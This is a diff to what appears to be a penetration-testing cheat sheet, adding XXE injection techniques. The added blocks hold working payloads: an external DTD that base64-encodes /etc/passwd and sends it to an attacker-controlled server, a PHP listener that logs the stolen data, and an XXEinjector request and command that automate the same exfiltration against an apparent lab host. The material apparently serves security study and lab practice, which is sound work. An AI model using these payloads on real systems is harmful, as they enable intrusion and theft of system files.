@@ -1451,8 +1451,8 @@ $ python3 -m http.server 8000
 ```
 $ echo '<!ENTITY % file SYSTEM "file:///etc/hosts">' > xxe.dtd
 $ cat << 'EOF' >> xxe.dtd
-$ <!ENTITY % error "<!ENTITY content SYSTEM '%nonExistingEntity;/%file;'>">
-$ EOF
+> <!ENTITY % error "<!ENTITY content SYSTEM '%nonExistingEntity;/%file;'>">
+> EOF
 $ python3 -m http.server 8000
 
 <?xml version="1.0" encoding="UTF-8"?>
@@ -1474,6 +1474,60 @@ $ python3 -m http.server 8000
          Test
       </message>
    </root>
+```
+
+- Blind Out-Of-Band Data Exfiltration
+
+```
+$ echo '<!ENTITY % file SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">' > xxe.dtd
+$ cat << 'EOF' >> xxe.dtd
+> <!ENTITY % oob "<!ENTITY content SYSTEM 'http://<IP address>:8000/?content=%file;'>">
+> EOF
+
+# Save to index.php
+<?php
+if(isset($_GET['content'])){
+    error_log("\n\n" . base64_decode($_GET['content']));
+}
+?>
+
+$ php -S 0.0.0.0:8000
+
+<?xml version="1.0" encoding="UTF-8"?>
+   <!DOCTYPE email [ 
+   <!ENTITY % remote SYSTEM "http://<IP address>:8000/xxe.dtd">
+   %remote;
+   %oob;
+   ]>
+   <root>
+      &content;
+   </root>
+```
+
+- Automated Out-Of-Band Data Exfiltration
+
+```
+$ git clone https://github.com/enjoiz/XXEinjector.git
+
+# Save this to xxe.req
+POST /blind/submitDetails.php HTTP/1.1
+Host: 10.129.201.94
+Content-Length: 169
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko)
+Content-Type: text/plain;charset=UTF-8
+Accept: */*
+Origin: http://10.129.201.94
+Referer: http://10.129.201.94/blind/
+Accept-Encoding: gzip, deflate
+Accept-Language: en-US,en;q=0.9
+Connection: close
+
+<?xml version="1.0" encoding="UTF-8"?>
+XXEINJECT
+
+$ ruby XXEinjector.rb --host=<IP address> --httpport=8000 --file=/tmp/xxe.req --path=/etc/passwd --oob=http --phpfilter
+
+$ cat Logs/10.129.201.94/etc/passwd.log
 ```
 
 #22. - Sensitive Data Exposure
